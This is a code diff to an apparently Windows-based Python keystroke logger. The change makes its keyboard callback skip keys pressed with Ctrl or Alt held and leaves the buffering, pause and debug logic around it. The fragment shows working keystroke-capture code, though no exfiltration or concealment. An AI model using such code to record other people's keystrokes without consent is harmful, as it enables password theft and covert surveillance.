@@ -1,4 +1,5 @@
 import keyboard
+from keyboard import is_pressed
 import win32api
 import win32event
 import win32console
@@ -109,6 +110,9 @@ def log_it():
 
 def key_callback(event):
     global line_buffer, paused
+    is_pressed_ctrl = is_pressed('ctrl') | is_pressed('right ctrl')
+    is_pressed_alt = is_pressed('alt') | is_pressed('alt gr')
+    
 
     # while paused no logging
     if paused:
@@ -117,7 +121,7 @@ def key_callback(event):
     # event key up 
     if event.event_type == 'up':
         return True
-    
+        
     # Debug Mode
     if config["mode"] == 'debug':
         line_buffer += event.name
@@ -133,7 +137,7 @@ def key_callback(event):
     elif event.name == 'backspace':
         if config["exclude-typos"]:
             line_buffer = line_buffer[:-1]
-    else:
+    elif not (is_pressed_ctrl | is_pressed_alt):
         if len(event.name) == 1:
             key_pressed = event.name
 
